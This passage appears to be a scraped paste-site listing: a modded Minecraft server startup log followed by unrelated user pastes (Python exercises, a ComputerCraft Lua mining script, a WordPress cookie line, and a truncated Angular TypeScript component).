[15:23:07] [main/WARN]: Ambiguity between arguments [set, players] and [set, amount] with inputs: [0123]
[15:23:07] [main/WARN]: Ambiguity between arguments [set, amount] and [set, players] with inputs: [0, -123, 123]
[15:23:07] [main/WARN]: Ambiguity between arguments [statistics, entities, byType, page] and [statistics, entities, byType, player] with inputs: [0, -123, 123]
[15:23:07] [main/WARN]: Ambiguity between arguments [statistics, entities, byType, player] and [statistics, entities, byType, page] with inputs: [0123]
[15:23:07] [main/WARN]: Ambiguity between arguments [statistics, block-entities, byType, page] and [statistics, block-entities, byType, player] with inputs: [0, -123, 123]
[15:23:07] [main/WARN]: Ambiguity between arguments [statistics, block-entities, byType, player] and [statistics, block-entities, byType, page] with inputs: [0123]
[15:23:07] [Worker-Main-3/ERROR]: Couldn't load tag hardcore_torches:consume_torch_smother_items as it is missing following references: #minecraft:wool_carpets (from Hardcore Torches)
[15:23:10] [Worker-Main-2/INFO]: Loaded 77 recipes
[15:23:11] [Worker-Main-2/ERROR]: Failed to load function spawnanimations:internal/hidden/trigger_damage/1_19_4
java.util.concurrent.CompletionException: java.lang.IllegalArgumentException: Whilst parsing command on line 3: command.unknown.argument at position 60: ...n execute <--[HERE]
        at java.util.concurrent.CompletableFuture.encodeThrowable(CompletableFuture.java:315) ~[?:?]
        at java.util.concurrent.CompletableFuture.completeThrowable(CompletableFuture.java:320) [?:?]
        at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java:1770) [?:?]
        at java.util.concurrent.CompletableFuture$AsyncSupply.exec(CompletableFuture.java:1760) [?:?]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:387) [?:?]
        at java.util.concurrent.ForkJoinPool$WorkQueue.topLevelExec(ForkJoinPool.java:1312) [?:?]
        at java.util.concurrent.ForkJoinPool.scan(ForkJoinPool.java:1843) [?:?]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1808) [?:?]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:188) [?:?]
Caused by: java.lang.IllegalArgumentException: Whilst parsing command on line 3: command.unknown.argument at position 60: ...n execute <--[HERE]
        at net.minecraft.class_2158.method_9195(class_2158.java:63) ~[server-intermediary.jar:?]
        at net.minecraft.class_5349.method_29451(class_5349.java:85) ~[server-intermediary.jar:?]
        at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java:1768) ~[?:?]
        ... 6 more
[15:23:11] [Worker-Main-2/INFO]: Loaded 6806 advancements
[15:23:11] [Worker-Main-2/INFO]: Loaded 0 conditional recipes
[15:23:11] [Worker-Main-2/INFO]: Loading Lava Java Flavors.
[15:23:11] [Worker-Main-2/INFO]: Loaded 28 Lava Java Flavors.
[15:23:11] [Worker-Main-2/INFO]: Loaded 9 revelations
[15:23:11] [Worker-Main-2/INFO]: Loaded 9 aspects
[15:23:11] [ForkJoinPool.commonPool-worker-2/INFO]: Loaded 67 translation keys
[15:23:11] [main/WARN]: Not all defined tags for registry ResourceKey[minecraft:root / minecraft:worldgen/biome] are present in data pack: betterend:has_structure/eternal_portal, betterend:has_structure/giant_ice_star, betterend:has_structure/giant_mossy_glowshroom, betterend:has_structure/megalake, betterend:has_structure/megalake_small, betterend:has_structure/mountain, betterend:has_structure/painted_mountain, betternether:has_structure/nether_city
[15:23:25] [main/INFO]: Loaded 71 block growths configurations
[15:23:25] [main/INFO]: Loaded 12 liquid generators configurations
[15:23:25] [main/INFO]: Applied 15828 biome modifications to 319 of 319 new biomes in 133.0 ms
[15:23:25] [Server thread/INFO]: loaded team data: 1 known players, 1 teams total
[15:23:26] [Server thread/INFO]: Loading server config for tradingpost
[15:23:26] [Server thread/INFO]: Registered region minecraft:overworld to index 0 for type OVERWORLD
[15:23:26] [Server thread/INFO]: Registered region minecraft:nether to index 0 for type NETHER
[15:23:26] [Server thread/INFO]: Initialized TerraBlender biomes for level stem minecraft:overworld
[15:23:26] [Server thread/INFO]: Initialized TerraBlender biomes for level stem minecraft:the_nether
[15:23:26] [Server thread/INFO]:         __
[15:23:26] [Server thread/INFO]:   |    |__)   LuckPerms v5.3.86
[15:23:26] [Server thread/INFO]:   |___ |      Running on Fabric - fabric@0.76.0+1.18.2
[15:23:26] [Server thread/INFO]:
[15:23:26] [Server thread/INFO]: Loading configuration...
[15:23:26] [Server thread/INFO]: Loading storage provider... [H2]
[15:23:27] [Server thread/INFO]: Loading internal permission managers...
[15:23:27] [Server thread/INFO]: Performing initial data load...
[15:23:27] [Server thread/INFO]: Successfully enabled. (took 713ms)
[15:23:27] [Server thread/INFO]: Starting minecraft server version 1.18.2
[15:23:27] [Server thread/INFO]: Loading properties
[15:23:27] [Server thread/INFO]: Default game type: SURVIVAL
[15:23:27] [Server thread/INFO]: Generating keypair
[15:23:27] [Server thread/INFO]: Starting Minecraft server on *:25565
[15:23:27] [Server thread/INFO]: Using default channel type
[15:23:27] [Server thread/WARN]: **** SERVER IS RUNNING IN OFFLINE/INSECURE MODE!
[15:23:27] [Server thread/WARN]: The server will make no attempt to authenticate usernames. Beware.
[15:23:27] [Server thread/WARN]: While this makes the game possible to play without internet access, it also opens up the ability for hackers to connect with any username they choose.
[15:23:27] [Server thread/WARN]: To change this, set ""online-mode"" to ""true"" in the server.properties file.
[15:23:27] [Server thread/INFO]: Preparing level ""world""
[15:23:28] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@7ad698ef
[15:23:28] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@52019e42
[15:23:29] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@1b06ea2b
[15:23:29] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@c188e5f
[15:23:29] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@1ee621dd
[15:23:29] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@5477bc14
[15:23:30] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@33726ee0
[15:23:30] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@7398c60
[15:23:30] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@2663d8b6
[15:23:30] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@2149817d
[15:23:31] [Server thread/WARN]: [bclib] No generator for net.minecraft.class_1992@64bc3804
[15:23:31] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@64bc3804
[15:23:31] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@25d4f878
[15:23:31] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@17714656
[15:23:31] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_1992@25442fd5
[15:23:32] [Server thread/INFO]: [bclib] Rebuilding features in BiomeSource net.minecraft.class_4766@693c6a57
[15:23:32] [Server thread/INFO]: Preparing start region for dimension minecraft:overworld
[15:23:32] [Server thread/INFO]: Not the long loadi-
[15:23:32] [Server thread/INFO]: Time elapsed: 499 ms
[15:23:32] [Server thread/INFO]: [MemoryLeakFix] Attempting to ForceLoad All Mixins and clear cache
[15:23:33] [Server thread/INFO]: [MemoryLeakFix] Done ForceLoad and clearing SpongePowered cache
[15:23:33] [Server thread/INFO]: Done (5.356s)! For help, type ""help""
[15:23:33] [Server thread/INFO]: Loading quests from .\config\ftbquests\quests
[15:23:33] [Server thread/INFO]: Loaded 2 chapter groups, 17 chapters, 467 quests, 0 reward tables
[15:23:33] [Server thread/INFO]: Loading quest progression data from .\config\ftbquests\quests
[15:23:33] [Server thread/INFO]: Encoded Weapon Attribute registry size (with package overhead): 502901 bytes (in 51 string chunks with the size of 10000)
[15:23:33] [Server thread/INFO]: [com.teamremastered.endrem.EndRemastered] PREPARING FOR RELOAD
[15:23:33] [Thread-9/INFO]: Voice UDP server started on /0.0.0.0:25565
[15:23:33] [Server thread/INFO]: Maintenance mode is off
[15:23:35] [AutoWhitelist Bot/ERROR]: Failed to start bot, please verify the token.
[15:23:36] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 3037ms or 60 ticks behind
spark tps
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб] TPS from last 5s, 10s, 1m, 5m, 15m:
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб]  19.98, *20.0, 20.0, 19.85, 19.95
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб]
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб] Tick durations (min/med/95%ile/max ms) from last 10s, 1m:
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб]  4.5/5.1/6.9/74.5;  4.5/5.3/8.0/74.5
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб]
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб] CPU usage from last 10s, 1m, 15m:
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб]  1%, 5%, 9%  (system)
[15:25:03] [spark-worker-pool-1-thread-1/INFO]: [тЪб]  0%, 3%, 7%  (process)
spark tps
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб] TPS from last 5s, 10s, 1m, 5m, 15m:
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб]  *20.0, *20.0, *20.0, 19.85, 19.95
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб]
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб] Tick durations (min/med/95%ile/max ms) from last 10s, 1m:
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб]  4.5/4.8/6.6/8.5;  4.4/5.1/7.5/74.5
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб]
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб] CPU usage from last 10s, 1m, 15m:
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб]  1%, 3%, 8%  (system)
[15:25:17] [spark-worker-pool-1-thread-3/INFO]: [тЪб]  0%, 2%, 6%  (process)
spark tps
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб] TPS from last 5s, 10s, 1m, 5m, 15m:
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб]  19.99, 20.0, *20.0, 19.85, 19.95
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб]
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб] Tick durations (min/med/95%ile/max ms) from last 10s, 1m:
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб]  4.4/4.8/6.6/7.5;  4.4/4.9/6.7/74.5
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб]
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб] CPU usage from last 10s, 1m, 15m:
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб]  0%, 1%, 7%  (system)
[15:25:34] [spark-worker-pool-1-thread-2/INFO]: [тЪб]  0%, 0%, 5%  (process)"
BznmyBmz,2 zad,Mira2706,Python,Sunday 18th of June 2023 07:22:53 AM CDT,"lst = [int(x) for x in input().split("" "")]
command = input()

while command != ""Finish"":
    command = command.split("" "")
    if command[0] == ""Add"":
        lst.append(command[1])
    elif command[0] == ""Remove"":
        if int(command[1]) in lst:
            lst.remove(int(command[1]))
    elif command[0] == ""Replace"":
        i = lst.index(int(command[1]))
        lst = lst[:i-1]+[command[2]]+lst[i:]
        lst.remove(int(command[1]))
    elif command[0] == ""Collapse"":
        lst = [x for x in lst if x >= int(command[1])]

    command = input()

print(*lst, sep="" "")"
FaxsKFGL,test,JimPlatinum,Lua,Sunday 18th of June 2023 07:21:22 AM CDT,"local MIN_FUEL_LEVEL = 5
local ENDER_CHEST_SLOT = 1
local POCKET_COMPUTER_ID = 123

-- message
local function sendMessage(message)
  rednet.send(POCKET_COMPUTER_ID, message)
end

-- Function got fuel?
local function needFuel()
  return turtle.getFuelLevel() < MIN_FUEL_LEVEL
end

-- Function refuel
local function refuel()
  -- Select the Ender Storage chest slot
  turtle.select(ENDER_CHEST_SLOT)
  turtle.digUp()
  turtle.placeUp()
  turtle.suckUp()
  turtle.refuel()
  
  for slot = 1, 16 do
    local itemDetail = turtle.getItemDetail(slot)
    if itemDetail and itemDetail.name == ""minecraft:bucket"" then
      turtle.select(slot)
      turtle.dropUp()
      break
    end
  end
  
  -- Remove the Ender Storage chest
  turtle.digUp()
end

-- Function for moving forward with auto refuel and path clearing
local function frd(steps)
  steps = steps or 1 -- Set default value to 1 if steps is nil
  for _ = 1, steps do
    if needFuel() then
      refuel()
    end
    turtle.dig() -- Dig before moving forward
    turtle.forward()
  end
end

-- MAIN PROGRAM --
term.write(""Length, Width, and Depth): "")
local input = io.read() -- Read a line of input from the player

-- Split the input into individual values
local length, width, depth = string.match(input, ""(%S+)%s+(%S+)%s+(%S+)"")

-- Convert the values to numbers (if needed)
length = tonumber(length)
width = tonumber(width)
depth = tonumber(depth)
"
KTDK061c,dem22.n25,Korotkodul,Python,Sunday 18th of June 2023 07:20:39 AM CDT,"import math
def f(n):
    div = []
    for d in range(2, math.ceil(n ** 0.5) + 1):
        if n % d == 0:
            div.append(d)
    if len(div) == 0:
        return 0
    M = div[0] + div[-1]
    return M

def get(n):
    div = []
    for d in range(2, math.ceil(n ** 0.5) + 1):
        if n % d == 0:
            div.append(d)
    print(div)

n = 700000
k = 0
""""""
700004 558
[2, 4, 139, 278, 556]
""""""


while k < 5:
    n += 1
    M = f(n)
    if str(M)[-1] == '8':
        print(n, M)
        #get(n)
        #print()
        k += 1
#t = 556
#print(700004 % t)

""""""
700004 558
700005 348
700013 758
700015 738
700019 158
""""""
#get(
"
xcj9Jx4Z,dem22.n24,Korotkodul,Python,Sunday 18th of June 2023 07:05:16 AM CDT,"f = open('24.txt')
s = f.readline()
f.close()

n = len(s)
i = 0
k = 1
mxk = 1
idx = 0
while i + 1 < n:
    i += 1
    if s[i] + s[i-1] == 'PP':
        if k > mxk:
            idx = i
            mxk = k
            k = 1
    else:
        k += 1
print(mxk, idx)
    
"
cYCcCuKQ,WordPress Test Cookie,fauzanedris,PHP,Sunday 18th of June 2023 07:04:27 AM CDT,"setcookie(TEST_COOKIE, 'WP Cookie check', 0, COOKIEPATH, COOKIE_DOMAIN);"
tnxChm6S,Reference Details Typescript,Dankan7,TypeScript,Sunday 18th of June 2023 06:57:19 AM CDT,"// (C) Copyright European Space Agency, 2023
import { Component, EventEmitter, Input, OnChanges, OnInit, Output, SimpleChanges } from '@angular/core';
import { AbstractControl, FormBuilder, FormControl, FormGroup } from '@angular/forms';
import { ConfirmationService, MessageService } from 'primeng/api';
import { Observable, Subject } from 'rxjs';
import { debounceTime } from 'rxjs/operators';
import { DataObject } from 'src/app/app-model/data-set/data-object';
import { DataObjectReference } from 'src/app/app-model/data-set/data-object-reference';
import { DataSet } from 'src/app/app-model/data-set/data-set';
import { EModelObject } from 'src/app/app-model/e-model/e-model-object';
import { EReference } from 'src/app/app-model/e-model/e-reference';
import { ClassService } from 'src/app/services/data-model/class.service';
import { ReferenceService } from 'src/app/services/data-model/reference.service';
import { DataRepositoryService } from 'src/app/services/data-repository.service';
import { DataViewService } from 'src/app/services/data-view-service';
import { EngineeringHelperService } from 'src/app/services/engineering-helper.service';
import { OpensearchService } from 'src/app/services/openserach.service';
import { SubscriptionTracker } from 'src/app/shared/subscription-tracker';
import { DataSetWrapper } from '../../app-model/data-set-wrapper';
import { DeleteDataObjectsCommand } from '../../app-model/delete-data-objects-command';
import { GetDataObjectsForDataSetCommand } from '../../app-model/get-data-objects-for-data-set-command';
import { DataObjectCreationData } from '../app-model/data-object-creation-data';
import { DataObjectDetailsQueryParameter, DataObjectFieldChange } from '../e-model-object-details/e-model-object-details.component';

@Component({
  selector: 'app-e-model-object-reference-details',
  templateUrl: './e-model-object-reference-details.component.html',
  styleUrls: ['./e-model-object-reference-details.component.css']
})
export class EModelObjectReferenceDetailsComponent extends SubscriptionTracker implements OnChanges, OnInit {

  @Output() updateEModelObjectEvent = new EventEmitter<EModelObject>();

  protected readonly saveRequestsSource: Subject<DataObjectFieldChange> = new Subject<DataObjectFieldChange>();
  protected saveRequests$: Observable<DataObjectFieldChange> = this.saveRequestsSource.asObservable();

  @Input() isRootDataObject: boolean;
  @Input() detailsFormConfig: any;
  @Input() eModelObject: EModelObject;
  @Input() dataModelTypeId: string;
  @Input() dataModelIncrementId: string;
  @Input() projectId: string;
  @Input() dataObjectId: string;
  @Input() dataSetId: string;
  @Input() dataSetBranch: string;
  @Input() embeddedReferenceOppositeId: string;
  @Input() dataSet: DataSet;

  shallow = false;
  loading = false;
  isEmbeddedDataObjectCreationDialogVisible = false;

  form: FormGroup;

  featureLabels = {};
  eReferences = new Array<EReference>();
  displayedManyReferences = new Array<EReference>();
  displayedSingleReferences = new Array<EReference>();
  dropDownDataSets: Map<string, DataSet> = new Map();
  embeddedObjectReferenceValueOptions: Map<string, DataSetWrapper[]> = new Map();
  embeddedReferencesMap: Map<string, EReference> = new Map();
  referenceValueDataObjects: Map<string, EModelObject> = new Map();
  embeddedReferencesOppositeIds: Map<string, string> = new Map();
  embeddedEModelObjectsMap: Map<string, EModelObject> = new Map();

  constructor(
    private dataRepositoryService: DataRepositoryService,
    private dataViewService: DataViewService,
    private engineeringHelperService: EngineeringHelperService,
    private fb: FormBuilder,
    private classService: ClassService,
    private referenceService: ReferenceService,
    private opensearchService: OpensearchService,
    private messageService: MessageService,
    private confirmationService: ConfirmationService) {
    super();
  }

  ngOnInit(): void {
    this.initDetails();
    this.engineeringHelperService.updateFormEnablement(this.form, this.dataSet);
    this.subscribeReferenceFormControlChanges();
    this.trackSubscription(this.dataViewService.dataObjectCreated$.subscribe((dataObjectCreationData: DataObjectCreationData) => {
      this.dataViewService.getDataObject({ dataObjectId: this.dataObjectId, dataSetId: this.dataSetId, projectId: this.projectId, dataSetBranch: this.dataSetBranch }).subscribe(updatedEModelObject => {
        this.updateEModelObject(updatedEModelObject);
      });
    }));
  }

  initDetails() {
    this.embeddedEModelObjectsMap.clear();
    this.dropDownDataSets.clear();
    this.embeddedReferencesMap.clear();
    this.embeddedEModelObjectsMap.clear();
    this.embeddedReferencesOppositeIds.clear();
    this.featureLabels = {};

    if (!!this.detailsFormConfig && !!this.detailsFormConfig.embeddedReferencedObjects) {
      this.loadEmbeddedObjectsData();
    }
    this.initDisplayedReferences();
  }

  ngOnChanges(changes: SimpleChanges) {
    if (!!changes) {
      if (!!changes.eModelObject && !changes.eModelObject.firstChange &&
        JSON.stringify(changes.eModelObject.currentValue) !== JSON.stringify(changes.eModelObject.previousValue)) {
        this.eModelObject = changes.eModelObject.currentValue;
        this.initDetails();
      }
    }
  }

  loadEmbeddedObjectsData() {
    for (const embeddedObject of this.detailsFormConfig.embeddedReferencedObjects) {
      const embeddedEReference = this.engineeringHelperService.getEReference(this.eModelObject.references, embeddedObject.reference);
      if (!!embeddedEReference && !!embeddedEReference.values && embeddedEReference.values.length > 0) {
        const embeddedObjectValue = embeddedEReference.values[0];
        const embeddedDataObjectValueReference: DataObjectReference = { dataObjectId: embeddedObjectValue.id, dataSetId: embeddedObjectValue.dataSetId, projectId: embeddedObjectValue.projectId };
        this.dataViewService.getDataObject(embeddedDataObjectValueReference).subscribe((embeddedObjectValue: EModelObject) => {
          this.embeddedEModelObjectsMap.set(embeddedEReference.name, embeddedObjectValue);
          this.loadEmbeddedObjectReferencesOpposites(embeddedObject, embeddedObjectValue);
        });
      }
    }
  }

  loadEmbeddedObjectReferencesOpposites(embeddedReference: any, embeddedObjectValue: EModelObject) {
    if (!!embeddedReference.object.references) {
      for (const referenceConfig of embeddedReference.object.references) {
        let eReference: EReference = null;
        if (!!embeddedObjectValue.references && embeddedObjectValue.references.length > 0) {
          eReference = embeddedObjectValue.references.find(eRef => eRef.name === referenceConfig.reference);

          this.referenceService.getOppositeReference(eReference.dataModelIncrementId, eReference.id).subscribe(eReferenceWithOpposite => {
            if (eReference !== null && !eReference.many) {
              this.embeddedReferencesOppositeIds.set(eReferenceWithOpposite.name, eReferenceWithOpposite.oppositeId);
            }
          });
        }
      }
    }
  }

  initDisplayedReferences() {
    this.form = this.fb.group({});
    const displayedManyReferences = [];
    const displayedSingleReferences = [];
    const singleReferencesThatEModelObjectDoesNotContain = [];

    if (this.shallow) {
      return;
    }
    if (!!this.detailsFormConfig && !!this.detailsFormConfig.references) {
      for (const referencesConfig of this.detailsFormConfig.references) {
        this.featureLabels[referencesConfig.reference] = this.engineeringHelperService.getReferenceLabel(referencesConfig);
        const reference = this.getReference(referencesConfig.reference);
        if (!!reference) {
          if (reference.many) {
            displayedManyReferences.push(reference);
          } else {
            displayedSingleReferences.push(reference);
            if (!!reference.values && reference.values.length > 0) {
              this.dataViewService.getDataObject(
                {
                  projectId: this.projectId,
                  dataObjectId: reference.values[0].id,
                  dataSetId: reference.values[0].dataSetId,
                  dataSetBranch: reference.values[0].dataSetBranch,
                }).subscribe(value => this.referenceValueDataObjects.set(reference.values[0].id, value));
            }
          }
        } else {
          singleReferencesThatEModelObjectDoesNotContain.push(referencesConfig.reference);
        }
      }
    } else if (!!this.eModelObject && !!this.eModelObject.references && this.eModelObject.references.length > 0) {
      for (const reference of this.eModelObject.references) {
        this.featureLabels[reference.name] = this.engineeringHelperService.getDefaultFeatureLabel(reference.name);
        if (reference.many) {
          displayedManyReferences.push(reference);
        } else {
          displayedSingleReferences.push(reference);
        }
      }
    }
    if (!!this.eModelObject) {
      displayedSingleReferences.forEach(eReference => {
        const referenceFormControlName = this.buildReferenceFormControl(eReference, this.form);
        if (Object.keys(this.form.controls).includes(referenceFormControlName)) {
          this.loadReferenceValue(eReference, referenceFormControlName);
        }
      });

      //loading references for which eModelObject does not contain as refValues
      singleReferencesThatEModelObjectDoesNotContain.forEach(notContainedRef => {
        const notContainedERef = this.eReferences.find(eRef => eRef.name === notContainedRef);
        if (!!notContainedERef) {
          const referenceFormControlName = this.buildReferenceFormControl(notContainedERef, this.form);
          if (Object.keys(this.form.controls).includes(referenceFormControlName)) {
            this.loadReferenceValue(notContainedERef, referenceFormControlName);
          }
        }
      });
    }

    //embedded references
    if (!!this.detailsFormConfig && !!this.detailsFormConfig.embeddedReferencedObjects) {
      for (const embeddedObject of this.detailsFormConfig.embeddedReferencedObjects) {
        this.featureLabels[embeddedObject.reference] = this.engineeringHelperService.getReferenceLabel(embeddedObject);
        const reference = this.getReference(embeddedObject.reference);
        if (!!reference && !reference.many) {
          displayedSingleReferences.push(reference);
        } else {
          displayedSingleReferences.push({ name: embeddedObject.reference });
        }
      }
    }
    this.displayedManyReferences = displayedManyReferences;
    this.displayedSingleReferences = displayedSingleReferences;
  }

  loadReferenceValue(eReference: EReference, controlName: string) {
    if (!!eReference.values && eReference.values.length > 0) {
      this.loadReferenceValuesDropDownOptions(controlName, eReference, eReference.values[0].id);
    }
  }

  private loadReferenceValuesDropDownOptions(referenceFormControlName: string, eReference: EReference, referenceValueDataObjectId: string) {
    const command: GetDataObjectsForDataSetCommand = {
      classId: !!eReference.typeId ? eReference.typeId : eReference.type.id,
      includeDataSetDependencies: true,
      includeSubTypes: true,
      dataSetReference: { dataSetId: this.dataSetId, projectId: this.projectId, dataSetBranch: this.dataSetBranch },
    };
    this.dataRepositoryService.getDataObjectsByDataSet(command).subscribe((dataSetWrappers: DataSetWrapper[]) => {
      //find and set the referenceValue of the reference
      let referenceValueObjectToSet = null;
      dataSetWrappers.forEach(wrapper => {
        if (wrapper.dataObjects.length > 0) {
          if (referenceValueObjectToSet === null && !!referenceValueDataObjectId) {
            referenceValueObjectToSet = wrapper.dataObjects.find(wrappedDataOBject => wrappedDataOBject.id === referenceValueDataObjectId);
          }
        }
        this.dropDownDataSets.set(wrapper.dataSet.id, wrapper.dataSet);
      });

      if (!!referenceValueObjectToSet) {
        this.form.get(referenceFormControlName).setValue(referenceValueObjectToSet);
      }

      if (!this.isRootDataObject) {
        if (!!this.embeddedReferenceOppositeId && this.embeddedReferenceOppositeId === eReference.id) {
          this.form.get(referenceFormControlName).disable();
        }
      }

      if (dataSetWrappers.length > 0) {
        this.embeddedObjectReferenceValueOptions.set(referenceFormControlName, dataSetWrappers);
      }
    });
  }

  getReference(name: string): EReference {
    if (!!this.eModelObject.references && this.eModelObject.references.length > 0) {
      for (const reference of this.eModelObject.references) {
        if (reference.name === name) {
          return reference;
        }
      }
    }
    return null;
  }

  getReferenceIsLink(reference: EReference): boolean {
    return this.engineeringHelperService.getReferenceIsLink(reference, this.detailsFormConfig);
  }

  isReferenceEmbedded(referenceName: string): boolean {
    if (!!this.detailsFormConfig && !!this.detailsFormConfig.embeddedReferencedObjects) {
      if (!!this.detailsFormConfig.embeddedReferencedObjects) {
        for (const embeddedObject of this.detailsFormConfig.embeddedReferencedObjects) {
          if (embeddedObject.reference === referenceName) {
            return true;
          }
        }
      }
    }
    return false;
  }

  public getReferenceDropdownList(referenceName: string): DataObject[] {
    const referenceFormControlName = this.getFormControlName(referenceName);
    if (this.embeddedObjectReferenceValueOptions.has(referenceFormControlName)) {
      const objects = [];
      this.embeddedObjectReferenceValueOptions.get(referenceFormControlName).forEach(wrapper => objects.push(...wrapper.dataObjects));
      return objects;
    }
    return [];
  }

  buildReferenceFormControl(eReference: EReference, formGroup: FormGroup): string {
    if (eReference.many) {
      //not supported yet
      return '';
    } else {
      formGroup.addControl(`0-${eReference.name}`, new FormControl());
      return `0-${eReference.name}`;
    }
  }

  subscribeReferenceFormControlChanges() {
    Object.keys(this.form.controls).forEach(attribute => {
      this.trackSubscription(this.form.get(attribute).valueChanges.subscribe(referenceValue => {
        if (!this.loading) {
          this.saveRequestsSource.next({ name: attribute, value: referenceValue });
        }
      }), attribute);
    });
    this.trackSubscription(this.saveRequests$.pipe(debounceTime(200)).subscribe((attributeChange: DataObjectFieldChange) => {
      this.saveReferenceChanges(attributeChange);
    }));
  }

  saveReferenceChanges(referenceChange: DataObjectFieldChange) {
    const controlToChange: AbstractControl = this.form.get(referenceChange.name);
    if (controlToChange.touched) {
      const formControlReferenceName = this.engineeringHelperService.extractFormControlAttributeName(referenceChange.name);
      const changedPosition: number = this.engineeringHelperService.extractFormControlPosition(referenceChange.name);
      const dataObjectReference: DataObjectReference = {
        projectId: this.eModelObject.projectId,
        dataObjectId: this.eModelObject.id,
        dataSetId: this.eModelObject.dataSetId,
        dataSetBranch: this.eModelObject.dataSetBranch
      };
      const dataObjectValue = controlToChange.value;
      const dataObjectValueReference: DataObjectReference = {
        projectId: dataObjectValue.projectId,
        dataObjectId: dataObjectValue.id,
        dataSetId: dataObjectValue.dataSetId,
        dataSetBranch: dataObjectValue.dataSetBranch
      };
      this.dataRepositoryService.updateDataObjectReferenceValue(dataObjectReference, dataObjectValueReference, formControlReferenceName, changedPosition).subscribe(() => {
        this.updateEModelObject(this.eModelObject);
      });
    }
  }

  getEmbeddedObjectFromMap(embeddedReferenceName: string): EModelObject {
    return this.embeddedEModelObjectsMap.get(embeddedReferenceName);
  }

  confirmEmbeddedObjectDeletion(referenceName: string) {
    this.confirmationService.confirm({
      message: `Are you sure that you want to delete ${referenceName} object?`,
      header: 'Confirmation',
      icon: 'pi pi-exclamation-triangle',
      accept: () => {
        this.deleteEmbeddedObject(referenceName);
      },
      reject: () => {
      }
    });
  }

  deleteEmbeddedObject(referenceName: string) {
    const embeddedDataObject = this.getEmbeddedObjectFromMap(referenceName);
    const command: DeleteDataObjectsCommand = {
      dataModelIncrementId: embeddedDataObject.dataModelIncrementId,
      dataModelTypeName: embeddedDataObject.className,
      dataSetReference: { dataSetId: embeddedDataObject.dataSetId, projectId: embeddedDataObject.projectId },
      targetDataObjectIds: [embeddedDataObject.id]
    };
    this.opensearchService.deleteDataObjects(command).subscribe(() => {
      const eRefIndex = this.eModelObject.references.findIndex(ref => referenceName === ref.name);
      this.eModelObject.references.splice(eRefIndex, 1);
      this.embeddedEModelObjectsMap.delete(referenceName);
      this.messageService.add({
        severity: 'success',
        summary: 'Deleted Object!',
      });
      this.initDetails();
    });
  }

  createEmbeddedObject(referenceName: string) {
    this.classService.getReferences({ classId: this.eModelObject.classId, dataModelIncrementId: this.eModelObject.dataModelIncrementId, recursive: false }).subscribe(references => {
      const eReference = references.find(reference => reference.name === referenceName);
      if (!!eReference) {
        this.embeddedReferencesMap.set(referenceName, eReference);
        this.isEmbeddedDataObjectCreationDialogVisible = true;
        return;
      }
    });
  }

  isPartOfEmbeddedEModelObjectReferences(referenceName: string): boolean {
    return !!this.eModelObject.references.find(eReference => eReference.name === referenceName);
  }

  getReferencedItemLinkQueryParams(reference: EReference): DataObjectDetailsQueryParameter {
    const navigationParams: DataObjectDetailsQueryParameter = {
      dataObjectId: reference?.values[0].id,
      dataSetId: reference?.values[0].dataSetId,
      dataModelTypeId: reference.typeId,
      dataModelTypeName: reference.typeName,
      dataSetBranch: reference?.values[0].dataSetBranch,
      dataModelIncrementId: reference.dataModelIncrementId
    };
    return navigationParams;
  }

  updateEModelObject(eModelObject: EModelObject) {
    this.updateEModelObjectEvent.emit(eModelObject);
  }

  getFormControlName(key: string): string {
    let controlName = key;
    Object.keys(this.form.controls).forEach(control => {
      const formControlReferenceName = this.engineeringHelperService.extractFormControlAttributeName(key);
      if (!!formControlReferenceName && formControlReferenceName === key) {
        controlName = control;
        return;
      }
    });
    return controlName;
  }

  getReferenceValueDisplayLabel(reference: EReference): string {
    if (!!reference.values && reference.values.length > 0) {
